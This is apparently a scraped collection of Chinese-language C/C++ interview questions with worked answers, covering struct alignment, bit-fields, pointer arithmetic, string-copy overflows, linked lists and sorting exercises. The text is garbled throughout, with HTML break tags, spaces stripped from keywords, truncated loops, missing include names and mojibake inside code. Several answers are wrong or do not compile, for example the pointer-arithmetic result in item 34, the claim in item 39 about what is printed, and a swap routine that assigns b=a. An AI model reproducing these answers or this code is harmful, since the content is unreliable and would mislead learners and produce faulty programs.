0;<br>}<br>输出为什么是<br>4<br>1<br>-1<br>-4<br>ffffffff<br>因为0x99在内存中表示为 100 11 001 , a = 001, b = 11, c = 100<br>当 c 为有符合数时, c = 100, 最高1为表示 c 为负数，负数在计算机用补码表示，所以 c = -4;<br>同理<br>b = -1;<br>当 c 为有符合数时, c = 100,即 c = 4,同理 b = 3<br>31、下面这个程序执行后会有什么错误或者效果:<br>#define MAX 255<br>int main()<br>{<br>unsigned char A[MAX],i;//i 被定义为 unsigned char<br>for (i=0;i&lt;=MAX;i++)<br>A[i]=i;<br>}<br>解答：死循环加数组越界访问（C/C++不进行数组越界检查）<br>MAX=255<br>数组 A 的下标范围为:0..MAX-1,这是其一..<br>其二.当 i 循环到255时,循环内执行:<br>A[255]=255;<br>这句本身没有问题..但是返回 for (i=0;i&lt;=MAX;i++)语句时,<br>由于 unsigned char 的取值范围在(0..255),i++以后 i 又为0了..无限循环下去.<br>32、写出 sizeof(struct name1)=,sizeof(struct name2)=的结果<br>struct name1{<br>char str;<br>short x;<br>int num;<br>}<br>struct name2{<br>char str;<br>int num;<br>short x;<br>}<br>sizeof(struct name1)=8,sizeof(struct name2)=12<br>在第二个结构中，为保证 num 按四个字节对齐，char 后必须留出3字节的空间；同时为保证<br>整个结构的自然对齐（这里是4字节对齐），在 x 后还要补齐2个字节，这样就是12字节。<br>33、struct s1<br>{<br>int i: 8;<br>int j: 4;<br>int a: 3;<br>double b;<br>};<br>struct s2<br>{<br>int i: 8;<br>int j: 4;<br>double b;<br>int a:3;<br>};<br>printf(“sizeof(s1)= %d\n”, sizeof(s1));<br>printf(“sizeof(s2)= %d\n”, sizeof(s2));<br>result: 16, 24<br>第一个 struct s1<br>{<br>int i: 8;<br>int j: 4;<br>int a: 3;<br>double b;<br>};<br>理论上是这样的，首先是 i 在相对0的位置，占8位一个字节，然后，j 就在相对一个字节的<br>位置，由于一个位置的字节数是4位的倍数，因此不用对齐，就放在那里了，然后是 a，要<br>在3位的倍数关系的位置上，因此要移一位，在15位的位置上放下，目前总共是18位，折算<br>过来是2字节2位的样子，由于 double 是8字节的，因此要在相对0要是8个字节的位置上放下，<br>因此从18位开始到8个字节之间的位置被忽略，直接放在8字节的位置了，因此，总共是16<br>字节。<br>第二个最后会对照是不是结构体内最大数据的倍数，不是的话，会补成是最大数据的倍数<br>34、在对齐为4的情况下<br>struct BBB<br>{<br>long num；<br>char *name;<br>short int data;<br>char ha;<br>short ba[5];<br>}*p;<br>p=0x1000000;<br>p+0x200=____;<br>(Ulong)p+0x200=____;<br>(char*)p+0x200=____;<br>希望各位达人给出答案和原因，谢谢拉<br>解答：假设在32位 CPU 上，<br>sizeof(long) = 4 bytes<br>sizeof(char *) = 4 bytes<br>sizeof(short int) = sizeof(short) = 2 bytes<br>sizeof(char) = 1 bytes<br>由于是4字节对齐，<br>sizeof(struct BBB) = sizeof(*p)<br>= 4 + 4 + 2 + 1 + 1/*补齐*/ + 2*5 + 2/*补齐*/ = 24 bytes (经 Dev-C++验证)<br>p=0x1000000;<br>p+0x200=____;<br>= 0x1000000 + 0x200*24<br>(Ulong)p+0x200=____;<br>= 0x1000000 + 0x200<br>(char*)p+0x200=____;<br>= 0x1000000 + 0x200*4<br>35、找错<br>Void test1()<br>{<br>char string[10];<br>char* str1=”0123456789”;<br>strcpy(string, str1);// 溢出，应该包括一个存放’\0’的字符 string[11]<br>}<br>Void test2()<br>{<br>char string[10], str1[10];<br>for(I=0; I&lt;10;I++)<br>{<br>str1[i] =’a’;<br>}<br>strcpy(string, str1);// I，i 没有声明。<br>}<br>Void test3(char* str1)<br>{<br>char string[10];<br>if(strlen(str1)&lt;=10)// 改成&lt;10,字符溢出，将 strlen 改为 sizeof 也可以<br>{<br>strcpy(string, str1);<br>}<br>}<br>36、写出输出结果<br>void g(int**);<br>int main()<br>{<br>int line[10],i;<br>int *p=line; //p 是地址的地址<br>for (i=0;i&lt;10;i++)<br>{<br>*p=i;<br>g(&amp;p);//数组对应的值加1<br>}<br>for(i=0;i&lt;10;i++)<br>printf(“%d\n”,line[i]);<br>return 0;<br>}<br>void g(int**p)<br>{<br>(**p)++;<br>(*p)++;// 无效<br>}<br>输出：<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>37、写出程序运行结果<br>int sum(int a)<br>{<br>auto int c=0;<br>static int b=3;<br>c+=1;<br>b+=2;<br>return(a+b+c);<br>}<br>void main()<br>{<br>int I;<br>int a=2;<br>for(I=0;I&lt;5;I++)<br>{<br>printf(“%d,”, sum(a));<br>}<br>}<br>// static 会保存上次结果，记住这一点，剩下的自己写<br>输出：8,10,12,14,16,<br>38、评价代码<br>int func(int a)<br>{<br>int b;<br>switch(a)<br>{<br>case 1: 30;<br>case 2: 20;<br>case 3: 16;<br>default: 0<br>}<br>return b;<br>}<br>则 func(1)=?<br>// b 定义后就没有赋值<br>int a[3];<br>a[0]=0; a[1]=1; a[2]=2;<br>int *p, *q;<br>p=a;<br>q=&amp;a[2];<br>则 a[q-p]=a[2]<br>解释：指针一次移动一个 int 但计数为1<br>39、请问一下程序将输出什么结果？<br>char *RetMenory(void)<br>{<br>char p[] = “hellow world”;<br>return p;<br>}<br>void Test(void)<br>{<br>char *str = NULL;<br>str = RetMemory();<br>printf(str);<br>}<br>RetMenory 执行完毕，p 资源被回收，指向未知地址。返回地址，str 的内容应是不可预测的,<br>打印的应该是 str 的地址<br>40、写出输出结果<br>typedef struct<br>{<br>int a:2;<br>int b:2;<br>int c:1;<br>}test;<br>test t;<br>t.a = 1;<br>t.b = 3;<br>t.c = 1;<br>printf(“%d”,t.a);<br>printf(“%d”,t.b);<br>printf(“%d”,t.c);<br>t.a 为01,输出就是1<br>t.b 为11，输出就是－1<br>t.c 为1，输出也是-1<br>3个都是有符号数 int 嘛。<br>这是位扩展问题<br>01<br>11<br>1<br>编译器进行符号扩展<br>41、对下面程序进行分析<br>void test2()<br>{<br>char string[10], str1[10];<br>int i;<br>for(i=0; i&lt;10; i++)<br>{<br>str1[i] = ‘a’;<br>}<br>strcpy( string, str1 );<br>}<br>解答：如果面试者指出字符数组 str1不能在数组内结束可以给3分；如果面试者指出<br>strcpy(string, str1)调用使得从str1内存起复制到string内存起所复制的字节数具有不确定性可<br>以给7分，在此基础上指出库函数 strcpy 工作方式的给10分；<br>str1不能在数组内结束:因为 str1的存储为：{a,a,a,a,a,a,a,a,a,a},没有’\0’(字符串结束符)，所以<br>不能结束<br>strcpy( char *s1,char *s2)他的工作原理是，扫描 s2指向的内存，逐个字符付到 s1所指向的内<br>存，直到碰到’\0’,因为 str1结尾没有’\0’，所以具有不确定性，不知道他后面还会付什么东东。<br>正确应如下<br>void test2()<br>{<br>char string[10], str1[10];<br>int i;<br>for(i=0; i&lt;9; i++)<br>{<br>str1[i] = ‘a’+i; //把 abcdefghi 赋值给字符数组<br>}<br>str[i]=’\0’;//加上结束符<br>strcpy( string, str1 );<br>}<br>42、分析：<br>int arr[] = {6,7,8,9,10};<br>int *ptr = arr;<br>*(ptr++)+=123;<br>printf(“ %d %d ”, *ptr, *(++ptr));<br>输出：8 8<br>过程：对于*(ptr++)+=123;先做加法6+123，然后++，指针指向7；对于 printf(“ %d %d ”, *ptr,<br>*(++ptr));从后往前执行，指针先++，指向8，然后输出8，紧接着再输出8<br>43、分析下面的代码：<br>char *a = “hello”;<br>char *b = “hello”;<br>if(a= =b)<br>printf(“YES”);<br>else<br>printf(“NO”);<br>这个简单的面试题目,我选输出 no(对比的应该是指针地址吧),可在 VC 是 YES 在 C 是 NO<br>lz 的呢，是一个常量字符串。位于静态存储区，它在程序生命期内恒定不变。如果编译器优<br>化的话，会有可能 a 和 b 同时指向同一个 hello 的。则地址相同。如果编译器没有优化，那<br>么就是两个不同的地址，则不同<br>44、写出输出结果<br>#include<br>void foo(int m, int n)<br>{<br>printf(“m=%d, n=%d\n”, m, n);<br>}<br>int main()<br>{<br>int b = 3;<br>foo(b+=3, ++b);<br>printf(“b=%d\n”, b);<br>return 0;<br>}<br>输出：m=7,n=4,b=7(VC6.0)<br>这种方式和编译器中得函数调用关系相关即先后入栈顺序。不过不同<br>编译器得处理不同。也是因为 C 标准中对这种方式说明为未定义，所以<br>各个编译器厂商都有自己得理解，所以最后产生得结果完全不同。<br>因为这样，所以遇见这种函数，我们首先要考虑我们得编译器会如何处理<br>这样得函数，其次看函数得调用方式，不同得调用方式，可能产生不同得<br>结果。最后是看编译器优化。<br>45、找出错误<br>#include string.h<br>main(void)<br>{ char *src=”hello,world”;<br>char *dest=NULL;<br>dest=(char *)malloc(strlen(src));<br>int len=strlen(str);<br>char *d=dest;<br>char *s=src[len];<br>while(len–!=0)<br>d++=s–;<br>printf(“%s”,dest);<br>}<br>找出错误！！<br>#include “string.h”<br>#include “stdio.h”<br>#include “malloc.h”<br>main(void)<br>{<br>char *src=”hello,world”;<br>char *dest=NULL;<br>dest=(char *)malloc(sizeof(char)*(strlen(src)+1));<br>int len=strlen(src);<br>char *d=dest;<br>char *s=src+len-1;<br>while(len–!=0)<br>*d++=*s–;<br>*d=’\0′;<br>printf(“%s”,dest);<br>}<br>第三部分：编程题<br>1、读文件 file1.txt 的内容（例如）：<br>12<br>34<br>56<br>输出到 file2.txt：<br>56<br>34<br>12<br>#include<br>#include<br>int main(void)<br>{<br>int MAX = 10;<br>int *a = (int *)malloc(MAX * sizeof(int));<br>int *b;<br>FILE *fp1;<br>FILE *fp2;<br>fp1 = fopen(“a.txt”,”r”);<br>if(fp1 == NULL)<br>{printf(“error1″);<br>exit(-1);<br>}<br>fp2 = fopen(“b.txt”,”w”);<br>if(fp2 == NULL)<br>{printf(“error2″);<br>exit(-1);<br>}<br>int i = 0;<br>int j = 0;<br>while(fscanf(fp1,”%d”,&amp;a[i]) != EOF)<br>{<br>i++;<br>j++;<br>if(i &gt;= MAX)<br>{<br>MAX = 2 * MAX;<br>b = (int</em>)realloc(a,MAX * sizeof(int));<br>if(b == NULL)<br>{<br>printf(“error3″);<br>exit(-1);<br>}<br>a = b;<br>}<br>}<br>for(;–j &gt;= 0;)<br>fprintf(fp2,”%d\n”,a[j]);<br>fclose(fp1);<br>fclose(fp2);<br>return 0;<br>}<br>2、输出和为一个给定整数的所有组合<br>例如 n=5<br>5=1+4；5=2+3（相加的数不能重复）<br>则输出<br>1，4；2，3。<br>#include<br>int main(void)<br>{<br>unsigned long int i,j,k;<br>printf(“please input the number\n”);<br>scanf(“%d”,&amp;i);<br>if( i % 2 == 0)<br>j = i / 2;<br>else<br>j = i / 2 + 1;<br>printf(“The result is \n”);<br>for(k = 0; k &lt; j; k++)<br>printf(“%d = %d + %d\n”,i,k,i - k);<br>return 0;<br>}<br>#include<br>void main()<br>{<br>unsigned long int a,i=1;<br>scanf(“%d”,&amp;a);<br>if(a%2==0)<br>{<br>for(i=1;i<br>printf(“%d”,a,a-i);<br>}<br>else<br>for(i=1;i&lt;=a/2;i++)<br>printf(“ %d, %d”,i,a-i);<br>}<br>3、递规反向输出字符串的例子,可谓是反序的经典例程.<br>void inverse(char *p)<br>{<br>if( *p = = ‘\0’ )<br>return;<br>inverse( p+1 );<br>printf( “%c”, *p );<br>}<br>int main(int argc, char *argv[])<br>{<br>inverse(“abc\0”);<br>return 0;<br>}<br>对1的另一种做法：<br>#include<br>void test(FILE *fread, FILE *fwrite)<br>{<br>char buf[1024] = {0};<br>if (!fgets(buf, sizeof(buf), fread))<br>return;<br>test( fread, fwrite );<br>fputs(buf, fwrite);<br>}<br>int main(int argc, char *argv[])<br>{<br>FILE *fr = NULL;<br>FILE *fw = NULL;<br>fr = fopen(“data”, “rb”);<br>fw = fopen(“dataout”, “wb”);<br>test(fr, fw);<br>fclose(fr);<br>fclose(fw);<br>return 0;<br>}<br>4、写一段程序，找出数组中第 k 大小的数，输出数所在的位置。例如{2，4，3，4，7}中，<br>第一大的数是7，位置在4。第二大、第三大的数都是4，位置在1、3随便输出哪一个均可。<br>函数接口为：int find_orderk(const int* narry,const int n,const int k)<br>要求算法复杂度不能是 O(n^2）<br>谢谢！<br>可以先用快速排序进行排序，其中用另外一个进行地址查找<br>代码如下，在 VC++6.0运行通过。给分吧^-^<br>//快速排序<br>#include<br>usingnamespacestd;<br>intPartition (int*L,intlow,int high)<br>{<br>inttemp = L[low];<br>intpt = L[low];<br>while (low &lt; high)<br>{<br>while (low &lt; high &amp;&amp; L[high] &gt;= pt)<br>–high;<br>L[low] = L[high];<br>while (low &lt; high &amp;&amp; L[low] &lt;= pt)<br>++low;<br>L[low] = temp;<br>}<br>L[low] = temp;<br>returnlow;<br>}<br>voidQSort (int*L,intlow,int high)<br>{<br>if (low &lt; high)<br>{<br>intpl = Partition (L,low,high);<br>QSort (L,low,pl - 1);<br>QSort (L,pl + 1,high);<br>}<br>}<br>intmain ()<br>{<br>intnarry[100],addr[100];<br>intsum = 1,t;<br>cout &lt;&lt; “Input number:” &lt;&lt; endl;<br>cin &gt;&gt; t;<br>while (t != -1)<br>{<br>narry[sum] = t;<br>addr[sum - 1] = t;<br>sum++;<br>cin &gt;&gt; t;<br>}<br>sum -= 1;<br>QSort (narry,1,sum);<br>for (int i = 1; i &lt;= sum;i++)<br>cout &lt;&lt; narry[i] &lt;&lt; ‘\t’;<br>cout &lt;&lt; endl;<br>intk;<br>cout &lt;&lt; “Please input place you want:” &lt;&lt; endl;<br>cin &gt;&gt; k;<br>intaa = 1;<br>intkk = 0;<br>for (;;)<br>{<br>if (aa == k)<br>break;<br>if (narry[kk] != narry[kk + 1])<br>{<br>aa += 1;<br>kk++;<br>}<br>}<br>cout &lt;&lt; “The NO.” &lt;&lt; k &lt;&lt; “number is:” &lt;&lt; narry[sum - kk] &lt;&lt; endl;<br>cout &lt;&lt; “And it’s place is:” ;<br>for (i = 0;i &lt; sum;i++)<br>{<br>if (addr[i] == narry[sum - kk])<br>cout &lt;&lt; i &lt;&lt; ‘\t’;<br>}<br>return0;<br>}<br>5、两路归并排序<br>Linklist *unio(Linklist *p,Linklist *q){<br>linklist *R,*pa,*qa,*ra;<br>pa=p;<br>qa=q;<br>R=ra=p;<br>while(pa-&gt;next!=NULL&amp;&amp;qa-&gt;next!=NULL){<br>if(pa-&gt;data&gt;qa-&gt;data){<br>ra-&gt;next=qa;<br>qa=qa-&gt;next;<br>}<br>else{<br>ra-&gt;next=pa;<br>pa=pa-&gt;next;<br>}<br>}<br>if(pa-&gt;next!=NULL)<br>ra-&gt;next=pa;<br>if(qa-&gt;next!=NULL)<br>ra-&gt;next==qa;<br>return R;<br>}<br>6、用递归算法判断数组 a[N]是否为一个递增数组。<br>递归的方法，记录当前最大的，并且判断当前的是否比这个还大，大则继续，否则返回 false<br>结束：<br>bool fun( int a[], int n )<br>{<br>if( n= =1 )<br>return true;<br>if( n= =2 )<br>return a[n-1] &gt;= a[n-2];<br>return fun( a,n-1) &amp;&amp; ( a[n-1] &gt;= a[n-2] );<br>}<br>7、单连表的建立，把’a’–’z’26个字母插入到连表中，并且倒叙，还要打印！<br>方法1：<br>typedef struct val<br>{ int date_1;<br>struct val *next;<br>}*p;<br>void main(void)<br>{ char c;<br>for(c=122;c&gt;=97;c–)<br>{ p.date=c;<br>p=p-&gt;next;<br>}<br>p.next=NULL;<br>}<br>}<br>方法2：<br>node *p = NULL;<br>node *q = NULL;<br>node *head = (node</em>)malloc(sizeof(node));<br>head-&gt;data = ‘ ‘;head-&gt;next=NULL;<br>node <em>first = (node</em>)malloc(sizeof(node));<br>first-&gt;data = ‘a’;first-&gt;next=NULL;head-&gt;next = first;<br>p = first;<br>int longth = ‘z’ – ‘b’;<br>int i=0;<br>while ( i&lt;=longth )<br>{<br>node *temp = (node*)malloc(sizeof(node));<br>temp-&gt;data = ‘b’+i;temp-&gt;next=NULL;q=temp;<br>head-&gt;next = temp; temp-&gt;next=p;p=q;<br>i++;<br>}<br>print(head);<br>8、请列举一个软件中时间换空间或者空间换时间的例子。<br>void swap(int a,int b)<br>{<br>int c; c=a;a=b;b=a;<br>}<br>—&gt;空优<br>void swap(int a,int b)<br>{<br>a=a+b;b=a-b;a=a-b;<br>}<br>9、outputstr 所指的值为123456789<br>int continumax(char <em>outputstr, char *inputstr)<br>{<br>char *in = inputstr, *out = outputstr, *temp, *final;<br>int count = 0, maxlen = 0;<br>while( *in != ‘\0′ )<br>{<br>if( *in &gt; 47 &amp;&amp; *in &lt; 58 )<br>{<br>for(temp = in; *in &gt; 47 &amp;&amp; *in &lt; 58 ; in++ )<br>count++;<br>}<br>else<br>in++;<br>if( maxlen &lt; count )<br>{<br>maxlen = count;<br>count = 0;<br>final = temp;<br>}<br>}<br>for(int i = 0; i &lt; maxlen; i++)<br>{<br>*out = *final;<br>out++;<br>final++;<br>}<br>*out = ‘\0’;<br>return maxlen;<br>}<br>10、不用库函数,用 C 语言实现将一整型数字转化为字符串<br>方法1：<br>int getlen(char *s){<br>int n;<br>for(n = 0; *s != ‘\0’; s++)<br>n++;<br>return n;<br>}<br>void reverse(char s[])<br>{<br>int c,i,j;<br>for(i = 0,j = getlen(s) - 1; i &lt; j; i++,j–){<br>c = s[i];<br>s[i] = s[j];<br>s[j] = c;<br>}<br>}<br>void itoa(int n,char s[])<br>{<br>int i,sign;<br>if((sign = n) &lt; 0)<br>n = -n;<br>i = 0;<br>do{/*以反序生成数字*/<br>s[i++] = n%10 + ‘0’;/*get next number*/<br>}while((n /= 10) &gt; 0);/*delete the number</em>/<br>if(sign &lt; 0)<br>s[i++] = ‘-‘;<br>s[i] = ‘\0’;<br>reverse(s);<br>}<br>方法2:<br>#include<br>using namespace std;<br>void itochar(int num);<br>void itochar(int num)<br>{<br>int i = 0;<br>int j ;<br>char stra[10];<br>char strb[10];<br>while ( num )<br>{<br>stra[i++]=num%10+48;<br>num=num/10;<br>}<br>stra[i] = ‘\0′;<br>for( j=0; j &lt; i; j++)<br>{<br>strb[j] = stra[i-j-1];<br>}<br>strb[j] = ‘\0’;<br>cout&lt;&lt; p=””&gt;<br>}<br>int main()<br>{<br>int num;<br>cin&gt;&gt;num;<br>itochar(num);<br>return 0;<br>}<br>11、求组合数： 求 n 个数（1….n）中 k 个数的组合….<br>如：combination(5,3)<br>要求输出：543，542，541，532，531，521，432，431，421，321，<br>#include<br>int pop(int <em>);<br>int push(int );<br>void combination(int ,int );<br>int stack[3]={0};<br>top=-1;<br>int main()<br>{<br>int n,m;<br>printf(“Input two numbers:\n”);<br>while( (2!=scanf(“%d%<em>c%d”,&amp;n,&amp;m)) )<br>{<br>fflush(stdin);<br>printf(“Input error! Again:\n”);<br>}<br>combination(n,m);<br>printf(“\n”);<br>}<br>void combination(int m,int n)<br>{<br>int temp=m;<br>push(temp);<br>while(1)<br>{<br>if(1==temp)<br>{<br>if(pop(&amp;temp)&amp;&amp;stack[0]==n) //当栈底元素弹出&amp;&amp;为可能取的最小值，循环退出<br>break;<br>}<br>else if( push(–temp))<br>{<br>printf(“%d%d%d “,stack[0],stack[1],stack[2]);//§ä¨ì¤@?<br>pop(&amp;temp);<br>}<br>}<br>}<br>int push(int i)<br>{<br>stack[++top]=i;<br>if(top&lt;2)<br>return 0;<br>else<br>return 1;<br>}<br>int pop(int *i)<br>{<br>*i=stack[top–];<br>if(top&gt;=0)<br>return 0;<br>else<br>return 1;<br>}<br>12、用指针的方法，将字符串“ABCD1234efgh”前后对调显示<br>#include<br>#include<br>#include<br>int main()<br>{<br>char str[] = “ABCD1234efgh”;<br>int length = strlen(str);<br>char * p1 = str;<br>char * p2 = str + length – 1;<br>while(p1 &lt; p2)<br>{<br>char c = *p1;<br>*p1 = *p2;<br>*p2 = c;<br>++p1;<br>–p2;<br>}<br>printf(“str now is %s\n”,str);<br>system(“pause”);<br>return 0;<br>}<br>13、有一分数序列：1/2,1/4,1/6,1/8……，用函数调用的方法，求此数列前20项的和<br>#include<br>double getValue()<br>{<br>double result = 0;<br>int i = 2;<br>while(i &lt; 42)<br>{<br>result += 1.0 / i;//一定要使用1.0做除数，不能用1，否则结果将自动转化成整数，即0.000000<br>i += 2;<br>}<br>return result;<br>}<br>int main()<br>{<br>printf(“result is %f\n”, getValue());<br>system(“pause”);<br>return 0;<br>}<br>14、有一个数组 a[1000]存放0–1000;要求每隔二个数删掉一个数，到末尾时循环至开头继续<br>进行，求最后一个被删掉的数的原始下标位置。<br>以7个数为例：<br>{0,1,2,3,4,5,6,7} 0–&gt;1–&gt;2（删除）–&gt;3–&gt;4–&gt;5(删除)–&gt;6–&gt;7–&gt;0（删除），如此循环直到最后<br>一个数被删除。<br>方法1：数组<br>#include<br>using namespace std;<br>#define null 1000<br>int main()<br>{<br>int arr[1000];<br>for (int i=0;i&lt;1000;++i)<br>arr[i]=i;<br>int j=0;<br>int count=0;<br>while(count&lt;999)<br>{<br>while(arr[j%1000]==null)<br>j=(++j)%1000;<br>j=(++j)%1000;<br>while(arr[j%1000]==null)<br>j=(++j)%1000;<br>j=(++j)%1000;<br>while(arr[j%1000]==null)<br>j=(++j)%1000;<br>arr[j]=null;<br>++count;<br>}<br>while(arr[j]==null)<br>j=(++j)%1000;<br>cout&lt;<br>return 0;<br>}方法2：链表<br>#include<br>using namespace std;<br>#define null 0<br>struct node<br>{<br>int data;<br>node* next;<br>};<br>int main()<br>{<br>node* head=new node;<br>head-&gt;data=0;<br>head-&gt;next=null;<br>node</em> p=head;<br>for(int i=1;i&lt;1000;i++)<br>{<br>node* tmp=new node;<br>tmp-&gt;data=i;<br>tmp-&gt;next=null;<br>head-&gt;next=tmp;<br>head=head-&gt;next;<br>}<br>head-&gt;next=p;<br>while(p!=p-&gt;next)<br>{<br>p-&gt;next-&gt;next=p-&gt;next-&gt;next-&gt;next;<br>p=p-&gt;next-&gt;next;<br>}<br>cout&lt; data;<br>return 0;<br>}<br>方法3：通用算法<br>#include<br>#define MAXLINE 1000 //元素个数<br>/*<br>MAXLINE 元素个数<br>a[] 元素数组<br>R[] 指针场<br>suffix 下标<br>index 返回最后的下标序号<br>values 返回最后的下标对应的值<br>start 从第几个开始<br>K 间隔<br>*/<br>int find_n(int a[],int R[],int K,int&amp; index,int&amp; values,int s=0) {<br>int suffix;<br>int front_node,current_node;<br>suffix=0;<br>if(s==0) {<br>current_node=0;<br>front_node=MAXLINE-1;<br>}<br>else {<br>current_node=s;<br>front_node=s-1;<br>}<br>while(R[front_node]!=front_node) {<br>printf(“%d\n”,a[current_node]);<br>R[front_node]=R[current_node];<br>if(K==1) {<br>current_node=R[front_node];<br>continue;<br>}<br>for(int i=0;i<br>front_node=R[front_node];<br>}<br>current_node=R[front_node];<br>}<br>index=front_node;<br>values=a[front_node];<br>return 0;<br>}<br>int main(void) {<br>int a[MAXLINE],R[MAXLINE],suffix,index,values,start,i,K;<br>suffix=index=values=start=0;<br>K=2;<br>for(i=0;i<br>a[i]=i;<br>R[i]=i+1;<br>}<br>R[i-1]=0;<br>find_n(a,R,K,index,values,2);<br>printf(“the value is %d,%d\n”,index,values);<br>return 0;<br>}<br>15、实现 strcmp<br>int StrCmp(const char *str1, const char *str2)<br>做是做对了，没有抄搞，比较乱<br>int StrCmp(const char *str1, const char *str2)<br>{<br>assert(str1 &amp;&amp; srt2);<br>while (*str1 &amp;&amp; *str2 &amp;&amp; *str1 == *str2) {<br>str1++, str2++;<br>}<br>if (*str1 &amp;&amp; *str2)<br>return (*str1-*str2);<br>elseif (*str1 &amp;&amp; *str2==0)<br>return 1;<br>elseif (*str1 = = 0 &amp;&amp; *str2)<br>return -1;<br>else<br>return 0;<br>}<br>int StrCmp(const char *str1, const char *str2)<br>{<br>//省略判断空指针(自己保证)<br>while(*str1 &amp;&amp; *str1++ = = *str2++);<br>return *str1-*str2;<br>}<br>16、实现子串定位<br>int FindSubStr(const char *MainStr, const char *SubStr)<br>做是做对了，没有抄搞，比较乱<br>int MyStrstr(const char* MainStr, const char* SubStr)<br>{<br>const char *p;<br>const char *q;<br>const char * u = MainStr;<br>//assert((MainStr!=NULL)&amp;&amp;( SubStr!=NULL));//用断言对输入进行判断<br>while(*MainStr) //内部进行递增<br>{<br>p = MainStr;<br>q = SubStr;<br>while(*q &amp;&amp; *p &amp;&amp; *p++ == *q++);<br>if(!*q )<br>{<br>return MainStr - u +1 ;//MainStr 指向当前起始位，u 指向<br>}<br>MainStr ++;<br>}<br>return -1;<br>}<br>17、已知一个单向链表的头，请写出删除其某一个结点的算法，要求，先找到此结点，然后<br>删除。<br>slnodetype *Delete(slnodetype *Head,int key){}中 if(Head-&gt;number==key)<br>{<br>Head=Pointer-&gt;next;<br>free(Pointer);<br>break;<br>}<br>Back = Pointer;<br>Pointer=Pointer-&gt;next;<br>if(Pointer-&gt;number==key)<br>{<br>Back-&gt;next=Pointer-&gt;next;<br>free(Pointer);<br>break;<br>}<br>void delete(Node</em> p)<br>{<br>if(Head = Node)<br>while(p)<br>}<br>18、有1,2,….一直到 n 的无序数组,求排序算法,并且要求时间复杂度为 O(n),空间复杂度 O(1),<br>使用交换,而且一次只能交换两个数.（华为）<br>#include<br>int main()<br>{<br>int a[] = {10,6,9,5,2,8,4,7,1,3};<br>int len = sizeof(a) / sizeof(int);<br>int temp;<br>for(int i = 0; i &lt; len; )<br>{<br>temp = a[a[i] - 1];<br>a[a[i] - 1] = a[i];<br>a[i] = temp;<br>if ( a[i] == i + 1)<br>i++;<br>}<br>for (int j = 0; j &lt; len; j++)<br>cout&lt;&lt;&lt;”,”;&lt; p=””&gt;<br>return 0;<br>}<br>19、写出程序把一个链表中的接点顺序倒排<br>typedef struct linknode<br>{<br>int data;<br>struct linknode <em>next;<br>}node;<br>//将一个链表逆置<br>node <em>reverse(node *head)<br>{<br>node *p,*q,*r;<br>p=head;<br>q=p-&gt;next;<br>while(q!=NULL)<br>{<br>r=q-&gt;next;<br>q-&gt;next=p;<br>p=q;<br>q=r;<br>}<br>head-&gt;next=NULL;<br>head=p;<br>return head;<br>}<br>20、写出程序删除链表中的所有接点<br>void del_all(node *head)<br>{<br>node *p;<br>while(head!=NULL)<br>{<br>p=head-&gt;next;<br>free(head);<br>head=p;<br>}<br>cout&lt;&lt;”释放空间成功!”&lt;<br>}<br>21、两个字符串，s,t;把 t 字符串插入到 s 字符串中，s 字符串有足够的空间存放 t 字符串<br>void insert(char *s, char *t, int i)<br>{<br>char *q = t;<br>char *p =s;<br>if(q == NULL)return;<br>while(*p!=’\0’)<br>{<br>p++;<br>}<br>while(*q!=0)<br>{<br>*p=*q;<br>p++;<br>q++;<br>}<br>*p = ‘\0’;<br>}<br>22、写一个函数，功能：完成内存之间的拷贝<br>memcpy source code:<br>270 void* memcpy( void *dst, const void *src, unsigned int len )<br>271 {<br>272 register char *d;<br>273 register char *s;<br>27<br>275 if (len == 0)<br>276 return dst;<br>277<br>278 if (is_overlap(dst, src, len, len))<br>279 complain3(“memcpy”, dst, src, len);<br>280<br>281 if ( dst &gt; src ) {<br>282 d = (char *)dst + len – 1;<br>283 s = (char *)src + len – 1;<br>284 while ( len &gt;= 4 ) {<br>285 *d– = *s–;<br>286 *d– = *s–;<br>287 *d– = *s–;<br>288 *d– = *s–;<br>289 len -= 4;<br>290 }<br>291 while ( len– ) {<br>292 *d– = *s–;<br>293 }<br>294 } else if ( dst &lt; src ) {<br>295 d = (char *)dst;<br>296 s = (char *)src;<br>297 while ( len &gt;= 4 ) {<br>298 *d++ = *s++;<br>299 *d++ = *s++;<br>300 *d++ = *s++;<br>301 *d++ = *s++;<br>302 len -= 4;<br>303 }<br>304 while ( len– ) {<br>305 *d++ = *s++;<br>306 }<br>307 }<br>308 return dst;<br>309 }<br>23、公司考试这种题目主要考你编写的代码是否考虑到各种情况，是否安全（不会溢出）<br>各种情况包括：<br>１、参数是指针，检查指针是否有效<br>２、检查复制的源目标和目的地是否为同一个，若为同一个，则直接跳出<br>３、读写权限检查<br>４、安全检查，是否会溢出<br>memcpy 拷贝一块内存，内存的大小你告诉它<br>strcpy 是字符串拷贝，遇到’\0′结束<br>/</em> memcpy ─── 拷贝不重叠的内存块 <em>/<br>void memcpy(void</em> pvTo, void</em> pvFrom, size_t size)<br>{<br>void* pbTo = (byte*)pvTo;<br>void* pbFrom = (byte*)pvFrom;<br>ASSERT(pvTo != NULL &amp;&amp; pvFrom != NULL); //检查输入指针的有效性<br>ASSERT(pbTo&gt;=pbFrom+size || pbFrom&gt;=pbTo+size);//检查两个指针指向的内存是否重叠<br>while(size–&gt;0)<br><em>pbTo++ == *pbFrom++;<br>return(pvTo);<br>}<br>24、两个字符串，s,t;把 t 字符串插入到 s 字符串中，s 字符串有足够的空间存放 t 字符串<br>void insert(char *s, char *t, int i)<br>{<br>memcpy(&amp;s[strlen(t)+i],&amp;s[i],strlen(s)-i);<br>memcpy(&amp;s[i],t,strlen(t));<br>s[strlen(s)+strlen(t)]=’\0′;<br>}<br>25、编写一个 C 函数，该函数在一个字符串中找到可能的最长的子字符串，且该字符串是<br>由同一字符组成的。<br>char * search(char *cpSource, char ch)<br>{<br>char *cpTemp=NULL, *cpDest=NULL;<br>int iTemp, iCount=0;<br>while(*cpSource)<br>{<br>if(*cpSource == ch)<br>{<br>iTemp = 0;<br>cpTemp = cpSource;<br>while(*cpSource == ch)<br>++iTemp, ++cpSource;<br>if(iTemp &gt; iCount)<br>iCount = iTemp, cpDest = cpTemp;<br>if(!*cpSource)<br>break;<br>}<br>++cpSource;<br>}<br>return cpDest;<br>}<br>26、请编写一个 C 函数，该函数在给定的内存区域搜索给定的字符，并返回该字符所在位<br>置索引值。<br>int search(char *cpSource, int n, char ch)<br>{<br>int i;<br>for(i=0; i<br>return i;<br>}<br>27、给定字符串 A 和 B,输出 A 和 B 中的最大公共子串。<br>比如 A=”aocdfe” B=”pmcdfa” 则输出”cdf”<br>*/<br>//Author: 